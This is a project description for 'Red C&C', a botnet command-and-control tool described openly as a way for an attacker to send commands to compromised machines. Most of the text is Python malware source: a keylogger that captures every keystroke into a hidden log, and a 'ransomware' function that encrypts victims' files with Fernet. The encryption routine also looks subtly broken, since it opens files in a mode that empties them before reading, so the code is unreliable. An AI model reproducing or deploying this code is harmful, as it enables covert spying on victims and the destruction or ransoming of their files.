# Red C&C
__ is a program focused on commanding and controlling a botnet. consist of two scripts: one that will be executed by the attacker and one that will be downloaded and executed on the targeted machines. __ will allow an attacker to send terminal commands to an entire botnet through a single interface and a single command. The purpose of __ is to simplify the communication between an attacker and the machines that they have compromised. 


### Starting the Handler
You can create a symbolic link that will work like a command by running the following:

ln [PATH to ss.py] /bin/redcc

For example:
```
ln ~/Red-C-C/scripts/net/ss.py /bin/redcc
```
This will result in being able to run the server program from anywhere by simply typing "redcc" on the command line. 


## Some of Red C&C's Highlights
### Built-in Keylogger
```python
def on_press(key):
	global LOG
	try:
		LOG += str(key.char)
	except AttributeError:
		if key == key.space:
			LOG += ' '
		elif key == key.enter: LOG += '\n'
		elif key == key.backspace: LOG += '' 
		elif key == key.ctrl: LOG += ' ctrl+'
		elif key == key.tab: LOG += '\t'
		elif key == key.cmd: LOG += ' cmd+'
		elif key == key.alt: LOG += ' alt+'
		elif key == key.caps_lock: LOG += ' CapsLock '
		elif key == key.delete: LOG += ' Del '
		elif key == key.down: LOG += ' DownArrow '
		elif key == key.left: LOG += ' LeftArrow '
		elif key == key.up: LOG += ' UpArrow '
		elif key == key.right: LOG += ' RightArrow'
		elif key == key.esc: LOG += ' esc '
		elif key == key.home: LOG += ' HomeKey '
		elif key == key.insert: LOG += ' InsertKey '
		elif key == key.print_screen: LOG += ' PrintScreen '
		elif key == key.shift: LOG += ' shift+'
		elif key == key.f1: LOG += ' F1 '
		elif key == key.f2: LOG += ' F2 '
		elif key == key.f3: LOG += ' F3 '
		elif key == key.f4: LOG += ' F4 '
		elif key == key.f5: LOG += ' F5 '
		elif key == key.f6: LOG += ' F6 '
		elif key == key.f7: LOG += ' F7 '
		elif key == key.f8: LOG += ' F8 '
		elif key == key.f9: LOG += ' F9 '
		elif key == key.f10: LOG += ' F10 '
		elif key == key.f11: LOG += ' F11 '
		elif key == key.f12: LOG += ' F12 '
		else:
			LOG += str(key)
def keylogger():
	listener = keyboard.Listener(on_press=on_press)
	try:
		if SYSTEM == 'Linux':
			os.mkdir(LIN_DIR)
		else:
			os.mkdir(WIN_DIR)
		log_to_file()
		listener.start()
	except OSError:
		pass
```
### Built-in Rasonware Operations
```python
def crypto(action: str, *args):
	if action == 'encrypt':
		to_encrypt = args[0]
		with open(to_encrypt, 'wb+') as f:
			data = f.read()
			key = Fernet.generate_key()
			cipher = Fernet(key)
			cipher_text = cipher.encrypt(data)
			f.seek(0)
			f.write(cipher_text)
			f.truncate()
			return f'  Save the decryption key -> {key.decode()}'
	else:
		to_encrypt, key = args[0][0], args[0][1]
		with open(to_encrypt, 'wb+') as f:
			cipher_text = f.read()
			cipher = Fernet(key)
			try:
				plain_text = cipher.decrypt(cipher_text)
			except cryptography.fernet.InvalidToken:
				return '  [-] Invalid key!'
			f.seek(0)
			f.write(plain_text)
			f.truncate()
			return '  [+] File successfully decrypted!'
```
